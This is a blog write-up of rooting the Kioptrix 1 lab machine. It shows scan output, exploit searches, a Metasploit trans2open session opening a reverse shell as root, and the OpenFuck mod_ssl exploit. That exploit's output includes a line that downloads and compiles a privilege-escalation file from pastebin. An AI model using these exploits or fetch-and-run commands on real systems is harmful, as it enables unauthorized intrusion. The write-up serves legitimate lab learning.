---
title: "How I Hacked My First Machine - Hacking Lab"
date: 2023-07-29T13:26:00+06:00
draft: false
tags: ["hacking", "infosec", "vulnhub", "pentesting"]
categories: ["Cybersecurity"]
---

One year ago, I embarked on my ethical hacking journey by exploring a vulnerable machine in a controlled environment (like VulnHub). While I wouldn't call it hacking in the traditional sense, it was a valuable learning experience that opened my eyes to the world of cybersecurity. Today, I'm revisiting that experience to share the steps involved in a safe and ethical exploration of a vulnerable machine.  

## Ethical Considerations

Before we dive in, it's crucial to understand that ethical hacking is all about permission. Always obtain explicit consent from the machine owner before conducting any security assessments. Responsible hackers also follow a structured methodology and best practices to avoid causing harm.    

## Machine Information
```
Name: Kioptrix 1
IP: 192.168.208.130
Difficulty: Beginner
```

## Scanning and Enumeration

The first step is reconnaissance, where we gather information about the target machine. We'll use a network scanner like Nmap to identify open ports, services running, and the operating system.  

### Nmap Scan
` sudo nmap -T4 -p- -A 192.168.208.130 `
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ sudo nmap -T4 -p- -A 192.168.208.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-06 08:37 EDT
Nmap scan report for 192.168.208.130
Host is up (0.0012s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
|_ssl-date: 2024-07-06T21:08:41+00:00; +8h31m10s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:AF:77:F8 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 8h31m09s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   1.16 ms 192.168.208.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.30 seconds
```
#### Nmap Output Analysis

The Nmap scan report will reveal details about the open ports and services. We'll analyze the output to identify potential vulnerabilities and services that might be exploitable.  

#### Ports and Info
> 22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)  
> 80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)  
> 111/tcp   open  rpcbind     2 (RPC #100000)  
> 139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)  
> 443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b  
> 32768/tcp open  status      1 (RPC #100024)  

### Enumeration Techniques

Based on the identified services, I used tools like nikto, metasploit, burpsuite, smbclient, dirbuster, etc. to gather further information. This could include details about web applications, network shares, or system configurations.

### Enumerating HTTP and HTTPS


If web services are found (ports 80 and/or 443), we might use tools like Nikto or Burp Suite to scan for common web application vulnerabilities like XSS, SQL injection, or insecure configurations.

#### Nikto Scan
`nikto -h http://192.168.208.130`
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ nikto -h http://192.168.208.130     
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.208.130
+ Target Hostname:    192.168.208.130
+ Target Port:        80
+ Start Time:         2024-07-06 09:24:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /test.php: This might be interesting.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8908 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2024-07-06 09:25:28 (GMT-4) (32 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
#### Directory Bruteforce
Directory Busting using Dirbuster  
Dirbuster Result:
```
## DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Wed Jul 26 21:34:36 BDT 2023

## [http://192.168.208.130:80](http://192.168.208.130/)

Directories found during testing:

Dirs found with a 403 response:

/cgi-bin/
/doc/

Dirs found with a 200 response:

/icons/
/
/manual/
/manual/mod/
/icons/small/
/usage/
/mrtg/
/manual/mod/mod_perl/
/manual/mod/mod_ssl/

---

Files found during testing:

Files found with a 200 responce:

/test.php
/usage/usage_202307.html
/usage/usage_200909.html
/mrtg/mrtg.html
/mrtg/unix-guide.html
/mrtg/nt-guide.html
/mrtg/cfgmaker.html
/mrtg/indexmaker.html
/mrtg/reference.html
/mrtg/faq.html
/mrtg/forum.html
/mrtg/mrtg-rrd.html
/mrtg/logfile.html
/mrtg/contrib.html
/mrtg/mibhelp.html
/mrtg/squid.html
/mrtg/webserver.html
/manual/mod/mod_ssl/ssl_overview.html
/manual/mod/mod_ssl/index.html
/manual/mod/mod_ssl/ssl_reference.html
/manual/mod/mod_ssl/ssl_compat.html
/manual/mod/mod_ssl/ssl_intro.html
/manual/mod/mod_ssl/ssl_howto.html
/manual/mod/mod_ssl/ssl_glossary.html
/manual/mod/mod_ssl/ssl_faq.html
```  

### Enumerating SMB
If the Samba service is present (port 139), tools like enum4linux or smbclient can be used to explore available shares and potentially identify weak permissions or misconfigurations. However, it's important to avoid brute-forcing credentials or exploiting vulnerabilities without explicit permission.  
  
Using **Metasploit**  
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ msfconsole
msf6 > search smb

msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > options
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.208.130
rhosts => 192.168.208.130
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.208.130:139   - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.208.130:139   -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.208.130:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 
```
#### SMB Findings
> Samba info and version: Samba 2.2.1a  
#### Attampt to connect to the fileshare - Samba
` smbclient -L  \\\\192.168.208.130\\ `
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ smbclient -L  \\\\192.168.208.130\\
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Password for [WORKGROUP\psychic]:

	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server)
	ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

	Server               Comment
	---------            -------
	KIOPTRIX             Samba Server

	Workgroup            Master
	---------            -------
	MYGROUP              KIOPTRIX                    
```
Got Two fileshare
> IPC$ and ADMIN$  

Now again With ADMIN$ fileshare  
` smbclient  \\\\192.168.208.130\\ADMIN$ `
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ smbclient  \\\\192.168.208.130\\ADMIN$
Password for [WORKGROUP\psychic]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
                                                                                                    
```

Trying with IPC$  
` smbclient  \\\\192.168.208.130\\IPC$ `   
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ smbclient  \\\\192.168.208.130\\IPC$
Password for [WORKGROUP\psychic]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> ls
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
smb: \> exit

```
Dead End.  

### Enumerating SSH
` ssh 192.168.208.130 `
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ ssh 192.168.208.130
psychic@192.168.208.130's password: 
```
Sometimes Banner is exposed. It can leak information.  

### Research and Analysis

Using the information from enumeration, I researched potential vulnerabilities associated with the software versions. Resources like Exploit-DB or security blogs can be helpful for this. However, it's important to never exploit vulnerabilities without permission.

### Researching Potential Vulnerabilities
Based on the services and versions identified during enumeration, we can search online resources like Exploit-DB, CVE Details, or security blogs to identify potential vulnerabilities associated with the software.  
  
**Google and Kali-tools Way...**
#### 80/443 HTTP and HTTPS  
##### mod_ssl/2.8.4  
![image](/writeups/kioptrix1-writeups/mod_ssl.jpg) 
from screenshot exploit-db result is outdated but Github one is updated.  

```
┌──(psychic㉿0xShakhawat)-[~]
└─$ searchsploit mod ssl 2.8.4
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                     | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)               | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)               | unix/remote/47080.c
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

80/443 Potentially Vulnerable to OpenFuck  

##### Apache httpd 1.3.20  
![image](/writeups/kioptrix1-writeups/apache_httpd.jpg) 

#### SMB 139  
![image](/writeups/kioptrix1-writeups/samba_2.2.1a.jpg)  

```
┌──(psychic㉿0xShakhawat)-[~]
└─$ searchsploit Samba 2.2.1a
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                             | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                        | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                    | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                            | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

SMB-139 Potentially vulnerable to trans2open  

##### Webalizer 2.01  
Webalizer version 2.01 potentially vulnerable to gain access to the system.  

#### OpenSSH 2.9p2
![image](/writeups/kioptrix1-writeups/openssh_2.9p2.jpg)   

```
┌──(psychic㉿0xShakhawat)-[~]
└─$ searchsploit OpenSSH 2.9p2
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                 | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                           | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                             | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                   | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privileg | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                 | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                     | linux/remote/45939.py
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

OpenSSH 2.9p2 Potentailly vulnerable to BufferOverFlow  

## Exploitation
### Gaining ROOT with Metasploit
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ msfconsole
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

msf6 > use exploit/linux/samba/trans2open
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > options
.......

msf6 exploit(linux/samba/trans2open) > set rhosts 192.168.208.130
rhosts => 192.168.208.130
msf6 exploit(linux/samba/trans2open) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Samba 2.2.x - Bruteforce


msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.208.139:4444 
[*] 192.168.208.130:139 - Trying return address 0xbffffdfc...
[*] 192.168.208.130:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1017704 bytes) to 192.168.208.130
[*] 192.168.208.130 - Meterpreter session 4 closed.  Reason: Died
[*] 192.168.208.130:139 - Trying return address 0xbfffdbfc...
[*] 192.168.208.130:139 - Trying return address 0xbfffdafc...
^C[-] 192.168.208.130:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
```
Meterpreter session 4 closed.  Reason: Died  
Payload used: ` linux/x86/meterpreter/reverse_tcp `  
Maybe payload is the issue.  
  
Let's chenge the payload to another payload  
Staged: ` linux/x86/shell/reverse_tcp`  
or,  
Non-Staged: ` linux/x86/shell_reverse_tcp `  
```
msf6 exploit(linux/samba/trans2open) > options

.......                    

msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.208.139:4444 
[*] 192.168.208.130:139 - Trying return address 0xbffffdfc...
[*] 192.168.208.130:139 - Trying return address 0xbffffcfc...
[*] 192.168.208.130:139 - Trying return address 0xbffffbfc...
[*] 192.168.208.130:139 - Trying return address 0xbffffafc...
[*] Sending stage (36 bytes) to 192.168.208.130
[*] 192.168.208.130:139 - Trying return address 0xbffff9fc...
[*] Sending stage (36 bytes) to 192.168.208.130
[*] 192.168.208.130:139 - Trying return address 0xbffff8fc...
[*] Sending stage (36 bytes) to 192.168.208.130
[*] 192.168.208.130:139 - Trying return address 0xbffff7fc...
[*] Sending stage (36 bytes) to 192.168.208.130
[*] 192.168.208.130:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.208.139:4444 -> 192.168.208.130:32773) at 2024-07-12 14:17:58 -0400

[*] Command shell session 6 opened (192.168.208.139:4444 -> 192.168.208.130:32774) at 2024-07-12 14:17:59 -0400
[*] Command shell session 7 opened (192.168.208.139:4444 -> 192.168.208.130:32775) at 2024-07-12 14:18:00 -0400
[*] Command shell session 8 opened (192.168.208.139:4444 -> 192.168.208.130:32776) at 2024-07-12 14:18:02 -0400
whoami
root
hostname
kioptrix.level1

```
![image](/blogs/i-hacked-my-first-machine/kioptrix1.jpg) 
I got shell now. Successfully rooted this machine

### Manual Exploitation
> 80/443 is Vulnerable to OpenFuck  
```
┌──(psychic㉿0xShakhawat)-[~/ctf/vulnhub/kioptrix1]
└─$ git clone https://github.com/heltonWernik/OpenFuck.git
Cloning into 'OpenFuck'...
remote: Enumerating objects: 26, done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
Receiving objects: 100% (26/26), 14.14 KiB | 278.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
```
Compiling the file...
```                   
┌──(psychic㉿0xShakhawat)-[~/ctf/vulnhub/kioptrix1]
└─$ cd OpenFuck               
                                                        
┌──(psychic㉿0xShakhawat)-[~/ctf/vulnhub/kioptrix1/OpenFuck]
└─$ ls
OpenFuck.c  README.md
                                                                                                                           
┌──(psychic㉿0xShakhawat)-[~/ctf/vulnhub/kioptrix1/OpenFuck]
└─$ gcc -o open OpenFuck.c -lcrypto                       
```
Compilation Done.

Not Executing the file to gain access to the machine
```             
┌──(psychic㉿0xShakhawat)-[~/ctf/vulnhub/kioptrix1/OpenFuck]
└─$ ls
open  OpenFuck.c  README.md
                                                                                                                           
┌──(psychic㉿0xShakhawat)-[~/ctf/vulnhub/kioptrix1/OpenFuck]
└─$ ./open                           

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./open target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
	0x00 - Caldera OpenLinux (apache-1.3.26)
	0x01 - Cobalt Sun 6.0 (apache-1.3.12)
	0x02 - Cobalt Sun 6.0 (apache-1.3.20)
	.
	.
	.
	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
	.
	.
	.
	0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
	0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
	0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
```
Using ` 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2 `  

```                        
┌──(psychic㉿0xShakhawat)-[~/ctf/vulnhub/kioptrix1/OpenFuck]
└─$ ./open 0x6b 192.168.208.130 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8068
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt 
--00:26:59--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @   1.92 MB/s

00:27:00 (1.28 MB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 1140
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...

whoami
root
hostname
kioptrix.level1

```
I got the shell.
  

### The Learning Curve

My experience with this machine taught me valuable lessons about:
 - Vulnerability discovery: How to identify potential weaknesses in systems.  
 - Research and analysis: The importance of understanding vulnerabilities before attempting exploitation (even for educational purposes).  
 - Ethical hacking principles: The importance of permission and responsible practices.  

### Conclusion

Exploring a vulnerable machine was a stepping stone in my ethical hacking journey. While I wouldn't call it hacking in the strictest sense, it was a crucial learning experience for understanding security concepts and the importance of ethical practices.

### Disclaimer

The information provided here is for educational purposes only. The author does not endorse or encourage unauthorized hacking activities. Always seek permission before conducting security assessments on any system.

By framing your experience as a learning process and emphasizing ethical considerations, you can create a valuable and informative blog post that resonates with aspiring ethical hackers.